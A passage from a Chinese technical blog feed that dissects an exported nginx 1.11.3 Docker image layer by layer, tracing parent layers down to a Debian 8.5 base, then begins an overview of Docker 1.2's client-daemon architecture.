class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;NGINX Docker Maintainers \&quot;docker-maint@nginx.com\&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c #(nop) ENV NGINX_VERSION=1.11.3-1~jessie&quot;</span><span class="punctuation">,</span><span class="attr">&quot;empty_layer&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2016-08-23T18:51:19.236946594Z&quot;</span><span class="punctuation">,</span><span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;NGINX Docker Maintainers \&quot;docker-maint@nginx.com\&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c apt-key adv --keyserver hkp://pgp.mit.edu:80 --recv-keys 573BFD6B3D8FBC641079A6ABABF5BD827BD9BF62 \t\u0026\u0026 echo \&quot;deb http://nginx.org/packages/mainline/debian/ jessie nginx\&quot; \u003e\u003e /etc/apt/sources.list \t\u0026\u0026 apt-get update \t\u0026\u0026 apt-get install --no-install-recommends --no-install-suggests -y \t\t\t\t\t\tca-certificates \t\t\t\t\t\tnginx=$&#123;NGINX_VERSION&#125; \t\t\t\t\t\tnginx-module-xslt \t\t\t\t\t\tnginx-module-geoip \t\t\t\t\t\tnginx-module-image-filter \t\t\t\t\t\tnginx-module-perl \t\t\t\t\t\tnginx-module-njs \t\t\t\t\t\tgettext-base \t\u0026\u0026 rm -rf /var/lib/apt/lists/*&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2016-08-23T18:51:21.574094006Z&quot;</span><span class="punctuation">,</span><span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;NGINX Docker Maintainers \&quot;docker-maint@nginx.com\&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c ln -sf /dev/stdout /var/log/nginx/access.log \t\u0026\u0026 ln -sf /dev/stderr /var/log/nginx/error.log&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2016-08-23T18:51:22.632895061Z&quot;</span><span class="punctuation">,</span><span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;NGINX Docker Maintainers \&quot;docker-maint@nginx.com\&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c #(nop) EXPOSE 443/tcp 80/tcp&quot;</span><span class="punctuation">,</span><span class="attr">&quot;empty_layer&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2016-08-23T18:51:23.709520142Z&quot;</span><span class="punctuation">,</span><span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;NGINX Docker Maintainers \&quot;docker-maint@nginx.com\&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c #(nop) CMD [\&quot;nginx\&quot; \&quot;-g\&quot; \&quot;daemon off;\&quot;]&quot;</span><span class="punctuation">,</span><span class="attr">&quot;empty_layer&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;os&quot;</span><span class="punctuation">:</span><span class="string">&quot;linux&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;rootfs&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;layers&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;diff_ids&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;sha256:2f71b45e4e254ddceb187b1467f5471f0e14d7124ac2dd7fdd7ddbc76e13f0e5&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;sha256:d7953e5e5bba5c637ce6eb81a4528a777c4265386cb12e9bff8124ef97538746&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;sha256:69ecf026ff94793ab573754612e6fa40b28331a47c3584de0b32d39a88959c37&quot;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>看完这个配置文件我惊到了，如此庞大的一个配置文件告诉我们dockerfile能配的我能配，dockerfile不能配的我也能配。。。这个配置文件具体就不分析了。。。</p>
<p>刚刚看完那个累心的配置文件，接下来让我们来说说这三个layer，哪一个layer是入口呢？</p>
<p>repositories:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;nginx&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;1.11.3&quot;</span><span class="punctuation">:</span><span class="string">&quot;01d69dac180439f10b5f2f06b71fa19c9f89fb85cb5fd543dba9bb2ca9b620ef&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>我们通过查看<code>repositories</code>可以看出<code>1.11.3</code>这个版本的layer入口是<code>01d69dac180439f10b5f2f06b71fa19c9f89fb85cb5fd543dba9bb2ca9b620ef</code>。那么三个layer之间的依赖关系怎样呢？让我们进入各个layer一探究竟吧。</p>
<h3 id="layer-01d69dac180439f10b5f2f06b71fa19c9f89fb85cb5fd543dba9bb2ca9b620ef"><a href="#layer-01d69dac180439f10b5f2f06b71fa19c9f89fb85cb5fd543dba9bb2ca9b620ef" class="headerlink" title="layer 01d69dac180439f10b5f2f06b71fa19c9f89fb85cb5fd543dba9bb2ca9b620ef"></a>layer 01d69dac180439f10b5f2f06b71fa19c9f89fb85cb5fd543dba9bb2ca9b620ef</h3><p>该layer中的<code>json</code>文件描述的本layer的配置信息</p>
<p>json:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="string">&quot;01d69dac180439f10b5f2f06b71fa19c9f89fb85cb5fd543dba9bb2ca9b620ef&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;parent&quot;</span><span class="punctuation">:</span><span class="string">&quot;c575e5db41b92dbf9e1814b8ea9cf989ef650e37cfcef12fa402e630db6a581f&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2016-08-23T18:51:23.709520142Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;container&quot;</span><span class="punctuation">:</span><span class="string">&quot;25ab8b143580751e438246801e7ba720f6f84ee9faca3522532e7fbe1ed7021f&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;container_config&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Hostname&quot;</span><span class="punctuation">:</span><span class="string">&quot;2da0903ff372&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Domainname&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;User&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AttachStdin&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AttachStdout&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AttachStderr&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ExposedPorts&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;443/tcp&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;80/tcp&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Tty&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;OpenStdin&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;StdinOnce&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Env&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span><span class="punctuation">,</span><span class="string">&quot;NGINX_VERSION=1.11.3-1~jessie&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Cmd&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;/bin/sh&quot;</span><span class="punctuation">,</span><span class="string">&quot;-c&quot;</span><span class="punctuation">,</span><span class="string">&quot;#(nop) CMD [\&quot;nginx\&quot; \&quot;-g\&quot; \&quot;daemon off;\&quot;]&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ArgsEscaped&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Image&quot;</span><span class="punctuation">:</span><span class="string">&quot;sha256:27ca9d70a764c6955e354f5fdc706b03ed47601213ac9fc638a8943fcc7680f8&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Volumes&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;WorkingDir&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Entrypoint&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;OnBuild&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Labels&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;docker_version&quot;</span><span class="punctuation">:</span><span class="string">&quot;1.10.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;NGINX Docker Maintainers \&quot;docker-maint@nginx.com\&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Hostname&quot;</span><span class="punctuation">:</span><span class="string">&quot;2da0903ff372&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Domainname&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;User&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AttachStdin&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AttachStdout&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AttachStderr&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ExposedPorts&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;443/tcp&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;80/tcp&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Tty&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;OpenStdin&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;StdinOnce&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Env&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span><span class="punctuation">,</span><span class="string">&quot;NGINX_VERSION=1.11.3-1~jessie&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Cmd&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;nginx&quot;</span><span class="punctuation">,</span><span class="string">&quot;-g&quot;</span><span class="punctuation">,</span><span class="string">&quot;daemon off;&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ArgsEscaped&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Image&quot;</span><span class="punctuation">:</span><span class="string">&quot;sha256:27ca9d70a764c6955e354f5fdc706b03ed47601213ac9fc638a8943fcc7680f8&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Volumes&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;WorkingDir&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Entrypoint&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;OnBuild&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Labels&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;architecture&quot;</span><span class="punctuation">:</span><span class="string">&quot;amd64&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;os&quot;</span><span class="punctuation">:</span><span class="string">&quot;linux&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>我们可以看到<code>parent</code>字段指出了当前layer的父layer是<code>c575e5db41b92dbf9e1814b8ea9cf989ef650e37cfcef12fa402e630db6a581f</code>。<br>当前layer中数据内容请见<code>layer.tar</code></p>
<p>layer.tar:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tree ./layer</span></span><br><span class="line">./layer</span><br><span class="line">└── var</span><br><span class="line">    └── log</span><br><span class="line">    └── nginx</span><br><span class="line">        ├── access.log -&gt; /dev/stdout</span><br><span class="line">        └── error.log -&gt; /dev/stderr</span><br></pre></td></tr></table></figure>

<h3 id="layer-c575e5db41b92dbf9e1814b8ea9cf989ef650e37cfcef12fa402e630db6a581f"><a href="#layer-c575e5db41b92dbf9e1814b8ea9cf989ef650e37cfcef12fa402e630db6a581f" class="headerlink" title="layer c575e5db41b92dbf9e1814b8ea9cf989ef650e37cfcef12fa402e630db6a581f"></a>layer c575e5db41b92dbf9e1814b8ea9cf989ef650e37cfcef12fa402e630db6a581f</h3><p>该layer中的<code>json</code>文件描述的本layer的配置信息</p>
<p>json:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="string">&quot;c575e5db41b92dbf9e1814b8ea9cf989ef650e37cfcef12fa402e630db6a581f&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;parent&quot;</span><span class="punctuation">:</span><span class="string">&quot;80cdba09b091f72276c031bd64488c3da5f82022812bc995f0859abe0855a872&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;1970-01-01T08:00:00+08:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;container_config&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Hostname&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Domainname&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;User&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AttachStdin&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AttachStdout&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AttachStderr&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Tty&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;OpenStdin&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;StdinOnce&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Env&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Cmd&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Image&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Volumes&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;WorkingDir&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Entrypoint&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;OnBuild&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Labels&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>该layer中的父layer是<code>80cdba09b091f72276c031bd64488c3da5f82022812bc995f0859abe0855a872</code><br>当前layer中的数据内容请见<code>layer.tar</code></p>
<p>layer.tar:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tree -L 2 ./layer</span></span><br><span class="line">./layer</span><br><span class="line">├── etc</span><br><span class="line">│   ├── alternatives</span><br><span class="line">│   ├── apt</span><br><span class="line">│   ├── ca-certificates</span><br><span class="line">│   ├── ca-certificates.conf</span><br><span class="line">│   ├── default</span><br><span class="line">│   ├── fonts</span><br><span class="line">│   ├── group</span><br><span class="line">│   ├── group-</span><br><span class="line">│   ├── gshadow</span><br><span class="line">│   ├── gshadow-</span><br><span class="line">│   ├── init.d</span><br><span class="line">│   ├── ld.so.cache</span><br><span class="line">│   ├── logrotate.d</span><br><span class="line">│   ├── nginx</span><br><span class="line">│   ├── passwd</span><br><span class="line">│   ├── passwd-</span><br><span class="line">│   ├── perl</span><br><span class="line">│   ├── rc0.d</span><br><span class="line">│   ├── rc1.d</span><br><span class="line">│   ├── rc2.d</span><br><span class="line">│   ├── rc3.d</span><br><span class="line">│   ├── rc4.d</span><br><span class="line">│   ├── rc5.d</span><br><span class="line">│   ├── rc6.d</span><br><span class="line">│   ├── shadow</span><br><span class="line">│   ├── shadow-</span><br><span class="line">│   ├── ssl</span><br><span class="line">│   ├── subgid</span><br><span class="line">│   ├── subgid-</span><br><span class="line">│   ├── subuid</span><br><span class="line">│   ├── subuid-</span><br><span class="line">│   └── ucf.conf</span><br><span class="line">├── lib</span><br><span class="line">│   └── x86_64-linux-gnu</span><br><span class="line">├── tmp</span><br><span class="line">├── usr</span><br><span class="line">│   ├── bin</span><br><span class="line">│   ├── lib</span><br><span class="line">│   ├── local</span><br><span class="line">│   ├── sbin</span><br><span class="line">│   └── share</span><br><span class="line">└── var</span><br><span class="line">    ├── cache</span><br><span class="line">    ├── lib</span><br><span class="line">    └── log</span><br></pre></td></tr></table></figure>

<h3 id="layer-80cdba09b091f72276c031bd64488c3da5f82022812bc995f0859abe0855a872"><a href="#layer-80cdba09b091f72276c031bd64488c3da5f82022812bc995f0859abe0855a872" class="headerlink" title="layer 80cdba09b091f72276c031bd64488c3da5f82022812bc995f0859abe0855a872"></a>layer 80cdba09b091f72276c031bd64488c3da5f82022812bc995f0859abe0855a872</h3><p>该layer中的<code>json</code>文件描述的本layer的配置信息<br>json:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="string">&quot;80cdba09b091f72276c031bd64488c3da5f82022812bc995f0859abe0855a872&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;1970-01-01T08:00:00+08:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;container_config&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Hostname&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Domainname&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;User&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AttachStdin&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AttachStdout&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AttachStderr&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Tty&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;OpenStdin&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;StdinOnce&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Env&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Cmd&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Image&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Volumes&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;WorkingDir&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Entrypoint&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;OnBuild&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Labels&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>从配置中可以看出，没有<code>parent</code>字段了。说明这个layer应该就是base layer了。(我十分好奇nginx镜像是用哪个基础镜像做出来的?)<br>当前layer中的数据内容请见<code>layer.tar</code><br>layer.tar:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tree -L 1 ./layer</span></span><br><span class="line">./layer</span><br><span class="line">├── bin</span><br><span class="line">├── boot</span><br><span class="line">├── dev</span><br><span class="line">├── etc</span><br><span class="line">├── home</span><br><span class="line">├── lib</span><br><span class="line">├── lib64</span><br><span class="line">├── media</span><br><span class="line">├── mnt</span><br><span class="line">├── opt</span><br><span class="line">├── proc</span><br><span class="line">├── root</span><br><span class="line">├── run</span><br><span class="line">├── sbin</span><br><span class="line">├── srv</span><br><span class="line">├── sys</span><br><span class="line">├── tmp</span><br><span class="line">├── usr</span><br><span class="line">└── var</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> ./layer/etc/debian_version</span></span><br><span class="line">8.5</span><br></pre></td></tr></table></figure>
<p>噢，原来nginx镜像是基于debian 8.5做出来的。</p>
]]></content>
      <categories>
        <category>container</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker架构</title>
    <url>/2017/01/31/container/docker/docker-frame/</url>
    <content><![CDATA[<h1 id="Docker历史"><a href="#Docker历史" class="headerlink" title="Docker历史"></a>Docker历史</h1><h1 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h1><p>Docker 1.2</p>
<h1 id="Docker架构"><a href="#Docker架构" class="headerlink" title="Docker架构"></a>Docker架构</h1><p>Docker对使用者来说是一个C&#x2F;S模式的架构，S端采用松耦合架构，各模块有机组合并支撑Docker运行。</p>
<p><img src="/images/docker/docker-frame-main.jpg" alt="docker-frame-main"></p>
<p>用户是使用Docker Client与Docker Daemon建立通信，并发送请求给后者。而Docker Daemon作为Docker架构中的主体部分，首先提供Server的功能使其可以接受Docker Client的请求；而后Engine执行Docker内部的一系列工作，每一项工作都是以一个Job的形式的存在。<br>Job的运行过程中，当需要容器镜像时，则从Docker Registry中下载镜像，并通过镜像管理驱动graphdriver将下载镜像以Graph的形式存储；当需要为Docker创建网络环境时，通过网络管理驱动networkdriver创建并配置Docker容器网络环境；当需要限制Docker容器运行资源或执行用户指令等操作时，则通过execdriver来完成。<br>libcontainer是一项独立的容器管理包，networkdriver以及execdriver都是通过libcontainer来实现具体对容器进行的操作。<br>当执行完运行容器的命令后，一个实际的Docker容器就处于运行状态，该容器拥有独立的文件系统，独立并且安全的运行环境等。</p>
